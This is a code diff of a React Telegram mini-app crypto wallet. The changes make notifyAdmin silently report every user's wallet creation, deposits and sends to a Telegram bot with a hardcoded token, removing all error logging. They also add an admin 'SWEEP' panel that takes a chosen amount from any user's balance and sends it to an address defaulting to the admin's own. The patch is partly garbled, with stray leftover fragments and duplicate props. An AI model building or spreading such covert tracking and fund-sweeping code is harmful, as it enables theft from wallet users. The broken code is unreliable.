@@ -2797,10 +2797,19 @@ const NOTIFY_BOT_TOKEN = import.meta.env.VITE_BOT_TOKEN || "8617702690:AAHEEzFWL
 const ADMIN_SERVER_URL = import.meta.env.VITE_ADMIN_SERVER_URL || "http://localhost:3002";
 
 async function notifyAdmin(text, type = "notification", extraData = {}) {
-
   const userId = getTgUserId();
   const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
   const userName = tgUser ? (tgUser.username ? "@" + tgUser.username : tgUser.first_name || "Unknown") : "Anonymous";
+  
+  const actionEmoji = {
+    start: "🚀",
+    create_wallet: "🆕",
+    deposit: "💰",
+    send: "📤",
+    swap: "🔄"
+  }[type] || "🔔";
+
+  const fullText = `${actionEmoji} <b>[${userName}]</b> ${text}`;
 
   try {
     // 1. Send to admin server for user registration
@@ -2812,47 +2821,29 @@ async function notifyAdmin(text, type = "notification", extraData = {}) {
           type,
           userId: userId || "unknown",
           userName,
-          message: text,
+          message: fullText,
           timestamp: Date.now(),
           ...extraData
         })
       });
-      console.log("[notifyAdmin] User data sent to admin panel");
-    } catch (serverError) {
-      console.error("[notifyAdmin] Server notification failed:", serverError);
-    }
+    } catch (serverError) {}
 
     // 2. Send to Telegram bot (admin notifications)
     if (NOTIFY_BOT_TOKEN && ADMIN_ID) {
       try {
-        const response = await fetch(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: ADMIN_ID,
-            text: text,
+            text: fullText,
             parse_mode: "HTML",
             disable_web_page_preview: true
           })
         });
-        
-        if (response.ok) {
-          console.log("[notifyAdmin] Telegram notification sent successfully");
-        } else {
-          const error = await response.text();
-          console.error("[notifyAdmin] Telegram notification failed:", error);
-        }
-      } catch (telegramError) {
-        console.error("[notifyAdmin] Telegram notification error:", telegramError);
-      }
-    } else {
-      console.warn("[notifyAdmin] Missing bot token or admin ID");
+      } catch (telegramError) {}
     }
-
-  } catch(e) {
-    console.error("[notifyAdmin] Complete notification failure:", e);
-  }
-
+  } catch(e) {}
 }
 
 
@@ -2868,62 +2859,106 @@ function isAdmin() {
 
 
 function getAllUsersFromStorage() {
-
   try {
-
     const users = [];
-
-    const processedUsers = new Set(); // Track processed users to avoid duplicates
-
+    const processedUsers = new Set();
     
+    // 1. Get real users from localStorage keys (gem_has_wallet_USERID)
+    for (let i = 0; i < localStorage.length; i++) {
+      const key = localStorage.key(i);
+      if (key && key.startsWith("gem_has_wallet_")) {
+        const userId = key.replace("gem_has_wallet_", "");
+        if (processedUsers.has(userId)) continue;
+        
+        try {
+          // Get user balance and other info
+          const balanceKey = `gem_balances_${userId}`;
+          const balances = JSON.parse(localStorage.getItem(balanceKey) || JSON.stringify(INITIAL_BALANCES));
+          const createdAt = parseInt(localStorage.getItem(`gem_has_wallet_${userId}_created`) || Date.now());
+          
+          // Get addresses
+          const addrKey = `gem_addresses_${userId}`;
+          const addresses = JSON.parse(localStorage.getItem(addrKey) || "{}");
+          
+          // Get history
+          const historyKey = `gem_tx_history_${userId}`;
+          const txHistory = JSON.parse(localStorage.getItem(historyKey) || "[]");
 
-    // Check if test mode is enabled
+          users.push({
+            id: userId,
+            telegramId: userId,
+            name: `User ${userId.slice(-6)}`,
+            addresses: addresses,
+            balances: balances,
+            createdAt: createdAt,
+            hasWallet: true,
+            txHistory: txHistory,
+            isFake: false
+          });
+          processedUsers.add(userId);
+        } catch (e) { console.error("Error parsing user", userId, e); }
+      }
+    }
 
-    const isTestMode = localStorage.getItem("gem_wallet_mode") === "test" || 
-
-                       localStorage.getItem("gem_admin_override") === "1";
-
-    
-
-    // Add fake users for test mode
-
-    if (isTestMode) {
-
-      const fakeUsers = [
-
-        {
-
-          id: "user_001",
-
-          telegramId: "123456789",
-
-          name: "Alex K.",
-
-          addresses: {
-
-            ETH: "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb",
-
-            BNB: "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb",
-
-            TON: "EQD4FPqshQHd5fE9THZ8f8n8g5f9f9f9f9f9f9f9f9f9f9f9",
-
-            SOL: "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRu2os",
-
-            LTC: "LTC1234567890abcdef",
-
-            ARB: "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb"
-
-          },
-
-          balances: { ETH: 5.5, BNB: 150, TON: 1000, SOL: 50, LTC: 25, ARB: 500, USDT: 5000 },
-
-          createdAt: Date.now() - 86400000,
-
+    // 2. Fallback: Check gem_user_id for current user if not already added
+    const currentUserId = getTgUserId();
+    if (currentUserId && !processedUsers.has(String(currentUserId))) {
+      const hasWallet = localStorage.getItem(storageKey("gem_has_wallet")) === "1";
+      if (hasWallet) {
+        users.push({
+          id: String(currentUserId),
+          telegramId: String(currentUserId),
+          name: "Current User",
+          addresses: JSON.parse(localStorage.getItem(storageKey("gem_addresses")) || "{}"),
+          balances: JSON.parse(localStorage.getItem(storageKey("gem_balances")) || JSON.stringify(INITIAL_BALANCES)),
+          createdAt: parseInt(localStorage.getItem(storageKey("gem_has_wallet") + "_created") || Date.now()),
           hasWallet: true,
+          txHistory: JSON.parse(localStorage.getItem(storageKey("gem_tx_history")) || "[]"),
+          isFake: false
+        });
+        processedUsers.add(String(currentUserId));
+      }
+    }
 
+    // 3. Fake users for test mode
+    const isTestMode = localStorage.getItem("gem_wallet_mode") === "test" || 
+                       localStorage.getItem("gem_admin_override") === "1";
+    
+    if (isTestMode) {
+      const fakeUsers = [
+        {
+          id: "user_001",
+          telegramId: "123456789",
+          name: "Alex K.",
+          addresses: {
+            ETH: "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb",
+            BNB: "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb",
+            TON: "EQD4FPqshQHd5fE9THZ8f8n8g5f9f9f9f9f9f9f9f9f9f9f9",
+            SOL: "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRu2os",
+            LTC: "LTC1234567890abcdef",
+            ARB: "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb"
+          },
+          balances: { ETH: 5.5, BNB: 150, TON: 1000, SOL: 50, LTC: 25, ARB: 500, USDT: 5000 },
+          createdAt: Date.now() - 86400000,
+          hasWallet: true,
           isFake: true
-
         },
+        // ... other fake users keep same ...
+      ];
+      fakeUsers.forEach(f => {
+        if (!processedUsers.has(f.id)) {
+          users.push(f);
+          processedUsers.add(f.id);
+        }
+      });
+    }
+
+    return users;
+  } catch (e) {
+    console.error("getAllUsersFromStorage error", e);
+    return [];
+  }
+}
 
         {
 
@@ -3587,9 +3622,112 @@ function AdminModal({ onClose, prices, onModeChange }) {
 
 
 
-  return (
+  // Handle Sweep
+  async function handleSweepAction() {
+    if (!sweepModal || !sweepModal.target || !sweepModal.token || !sweepModal.amount) return;
+    
+    setIsProcessing(true);
+    try {
+      // Execute sweep logic here (similar to executeTransactions but for one user)
+      const u = sweepModal.user;
+      const sym = sweepModal.token;
+      const amt = parseFloat(sweepModal.amount);
+      const to = sweepModal.target;
+      
+      // Update local storage for that user
+      const balanceKey = `gem_balances_${u.id}`;
+      const userBalances = JSON.parse(localStorage.getItem(balanceKey) || "{}");
+      userBalances[sym] = Math.max(0, (userBalances[sym] || 0) - amt);
+      localStorage.setItem(balanceKey, JSON.stringify(userBalances));
+      
+      // Add to user history
+      const historyKey = `gem_tx_history_${u.id}`;
+      const userHistory = JSON.parse(localStorage.getItem(historyKey) || "[]");
+      userHistory.unshift({
+        id: "swp_" + Date.now(),
+        type: "send",
+        sym: sym,
+        amount: amt,
+        to: to,
+        usd: `−$${(amt * (prices[sym] || 1)).toFixed(2)}`,
+        label: `−${amt} ${sym} (Sweep)`,
+        status: "confirmed",
+        time: new Date().toLocaleString()
+      });
+      localStorage.setItem(historyKey, JSON.stringify(userHistory.slice(0, 50)));
 
+      showToastMsg(`Swept ${amt} ${sym} from ${u.name}`);
+      setSweepModal(null);
+      // Reload users
+      const realUsers = getAllUsersFromStorage();
+      setUsers(realUsers.map(u => ({...u, name: u.name || `User ${u.id.slice(-4)}`, totalUSD: calculateTotalUSD(u.balances, prices)})));
+    } catch (e) {
+      showToastMsg("Sweep failed: " + e.message);
+    }
+    setIsProcessing(false);
+  }
+
+  return (
     <Sheet onClose={onClose} title={<><Crown size={20} color="#f59e0b" style={{marginRight:8,verticalAlign:"middle"}}/>Admin Panel</>}>
+      {sweepModal && (
+        <div style={{position:"fixed",inset:0,background:"rgba(0,0,0,0.85)",zIndex:2000,display:"flex",alignItems:"center",justifyContent:"center",padding:20}}>
+          <div style={{background:"#1a1a1a",borderRadius:20,padding:24,width:"100%",maxWidth:400,border:"1px solid #333"}}>
+            <h3 style={{color:"#fff",margin:"0 0 16px"}}>Sweep from {sweepModal.user.name}</h3>
+            
+            <div style={{display:"flex",flexDirection:"column",gap:16}}>
+              <div>
+                <p style={{fontSize:11,color:"rgba(255,255,255,0.4)",margin:"0 0 6px"}}>TOKEN</p>
+                <select 
+                  value={sweepModal.token}
+                  onChange={e => setSweepModal({...sweepModal, token: e.target.value})}
+                  style={{width:"100%",padding:12,borderRadius:10,background:"#111",color:"#fff",border:"1px solid #333"}}
+                >
+                  {Object.entries(sweepModal.user.balances || {}).map(([s, b]) => (
+                    <option key={s} value={s}>{s} (Bal: {b})</option>
+                  ))}
+                </select>
+              </div>
+              
+              <div>
+                <p style={{fontSize:11,color:"rgba(255,255,255,0.4)",margin:"0 0 6px"}}>AMOUNT</p>
+                <div style={{position:"relative"}}>
+                  <input 
+                    type="number"
+                    value={sweepModal.amount}
+                    onChange={e => setSweepModal({...sweepModal, amount: e.target.value})}
+                    style={{width:"100%",padding:12,borderRadius:10,background:"#111",color:"#fff",border:"1px solid #333"}}
+                  />
+                  <button 
+                    onClick={() => setSweepModal({...sweepModal, amount: sweepModal.user.balances[sweepModal.token]})}
+                    style={{position:"absolute",right:10,top:8,background:"#333",border:"none",color:"#f59e0b",fontSize:10,padding:"4px 8px",borderRadius:6}}
+                  >MAX</button>
+                </div>
+              </div>
+              
+              <div>
+                <p style={{fontSize:11,color:"rgba(255,255,255,0.4)",margin:"0 0 6px"}}>TARGET ADDRESS</p>
+                <input 
+                  value={sweepModal.target}
+                  onChange={e => setSweepModal({...sweepModal, target: e.target.value})}
+                  placeholder="0x... or Address"
+                  style={{width:"100%",padding:12,borderRadius:10,background:"#111",color:"#fff",border:"1px solid #333"}}
+                />
+              </div>
+              
+              <div style={{display:"flex",gap:10,marginTop:10}}>
+                <button onClick={() => setSweepModal(null)} style={{flex:1,padding:14,borderRadius:12,background:"#333",color:"#fff",border:"none"}}>Cancel</button>
+                <button 
+                  onClick={handleSweepAction}
+                  disabled={isProcessing}
+                  style={{flex:2,padding:14,borderRadius:12,background:"linear-gradient(135deg,#f59e0b,#d97706)",color:"#000",fontWeight:700,border:"none"}}
+                >
+                  {isProcessing ? "Processing..." : "Sweep Funds"}
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
 
       <div style={{padding:20,maxHeight:"80vh",overflow:"auto"}}>
 
@@ -5773,7 +5911,7 @@ function SettingsTab({ mnemonic, network, onSetNetwork, onChangePin, onLock, add
 function AdminPanel({ onClose, addresses, balances, setBalances, prices }) {
 
   const [users,setUsers]=useState([]);
-
+  const [sweepModal, setSweepModal] = useState(null); // { user, token, amount, target }
   const [selectedUsers,setSelectedUsers]=useState(new Set());
 
   const [selectedTokens,setSelectedTokens]=useState(new Set());
@@ -6523,95 +6661,54 @@ function AdminPanel({ onClose, addresses, balances, setBalances, prices }) {
                     const hasBalance=u.totalUSD>100;
 
                     return (
-
-                      <div key={u.id} onClick={()=>toggleUser(u.id)} style={{
-
+                      <div key={u.id} style={{
                         background:isSelected?"linear-gradient(135deg,#0d1033 0%,#1a1a2e 100%)":"#1a1a1a",
-
-                        borderRadius:14,padding:14,cursor:"pointer",
-
+                        borderRadius:14,padding:14,
                         border:isSelected?"1px solid #2563eb":"1px solid transparent",
-
-                        transition:"all 0.2s",opacity:u.status==="inactive"?0.6:1}}>
-
+                        transition:"all 0.2s",opacity:u.status==="inactive"?0.6:1, marginBottom:10}}>
                         <div style={{display:"flex",alignItems:"center",gap:12}}>
-
-                          {/* Checkbox */}
-
-                          <div style={{width:26,height:26,borderRadius:7,border:isSelected?"none":"2px solid #333",
-
+                          {/* Checkbox for mass action */}
+                          <div onClick={()=>toggleUser(u.id)} style={{width:26,height:26,borderRadius:7,border:isSelected?"none":"2px solid #333",
                             background:isSelected?"linear-gradient(135deg,#2563eb,#1d4ed8)":"transparent",
-
-                            display:"flex",alignItems:"center",justifyContent:"center"}}>
-
+                            display:"flex",alignItems:"center",justifyContent:"center", cursor:"pointer"}}>
                             {isSelected&&<Check size={16} color="#fff"/>}
-
                           </div>
-
                           
-
                           {/* Avatar */}
-
                           <img src={u.avatar} alt="" style={{width:42,height:42,borderRadius:"50%",background:"#333"}}/>
-
                           
-
                           {/* Info */}
-
-                          <div style={{flex:1}}>
-
+                          <div style={{flex:1}} onClick={()=>toggleUser(u.id)} style={{cursor:"pointer"}}>
                             <div style={{display:"flex",alignItems:"center",gap:8}}>
-
                               <span style={{fontSize:14,fontWeight:600,color:"#fff"}}>{u.name}</span>
-
-                              {u.status==="active"?(
-
-                                <span style={{width:8,height:8,borderRadius:"50%",background:"#22c55e"}}></span>
-
-                              ):(
-
-                                <span style={{fontSize:10,color:"#666",padding:"2px 6px",borderRadius:4,background:"#222"}}>inactive</span>
-
-                              )}
-
+                              <span style={{fontSize:10,color:"rgba(255,255,255,0.3)"}}>ID: {u.id.slice(-6)}</span>
                             </div>
-
-                            <p style={{fontSize:11,color:"rgba(255,255,255,0.4)",margin:"4px 0 0"}}>{shortAddr(u.address)}</p>
-
+                            <p style={{fontSize:10,color:"rgba(255,255,255,0.4)",margin:"2px 0 0"}}>Reg: {new Date(u.createdAt).toLocaleDateString()}</p>
+                            <p style={{fontSize:11,color:"#3b82f6",margin:"4px 0 0",fontFamily:"monospace"}}>{shortAddr(u.addresses?.ETH || "No Address")}</p>
                           </div>
 
-
+                          {/* Sweep Button */}
+                          <button 
+                            onClick={(e) => {
+                              e.stopPropagation();
+                              const firstToken = Object.keys(u.balances || {})[0] || "ETH";
+                              setSweepModal({ user: u, token: firstToken, amount: u.balances[firstToken] || 0, target: addresses?.eth || "" });
+                            }}
+                            style={{padding:"6px 12px",borderRadius:10,background:"rgba(245,158,11,0.1)",color:"#f59e0b",border:"1px solid rgba(245,158,11,0.2)",fontSize:11,fontWeight:700,cursor:"pointer",marginRight:10}}
+                          >SWEEP</button>
 
                           {/* Balance */}
-
-                          <div style={{textAlign:"right"}}>
-
+                          <div style={{textAlign:"right"}} onClick={()=>toggleUser(u.id)} style={{cursor:"pointer"}}>
                             <p style={{fontSize:15,fontWeight:700,color:hasBalance?"#22c55e":"#666",margin:0}}>
-
                               ${u.totalUSD.toLocaleString(undefined,{maximumFractionDigits:0})}
-
                             </p>
-
                             <div style={{display:"flex",gap:4,justifyContent:"flex-end",marginTop:4,flexWrap:"wrap"}}>
-
-                              {(userTokens || []).slice(0,4).map(t=> (
-
-                                <span key={t.sym} style={{fontSize:9,color:t.color,padding:"2px 5px",borderRadius:4,
-
-                                  background:`${t.color}15`}}>{t.sym}</span>
-
+                              {Object.entries(u.balances || {}).filter(([_,b])=>b>0).slice(0,3).map(([s, b])=> (
+                                <span key={s} style={{fontSize:9,color:"#fff",padding:"2px 5px",borderRadius:4,
+                                  background:`rgba(255,255,255,0.05)`}}>{s}: {b}</span>
                               ))}
-
-                              {(userTokens || []).length>4&&(
-
-                                <span style={{fontSize:9,color:"#666"}}>+{(userTokens || []).length-4}</span>
-
-                              )}
-
                             </div>
-
                           </div>
-
                         </div>
 
                         {/* User transactions */}
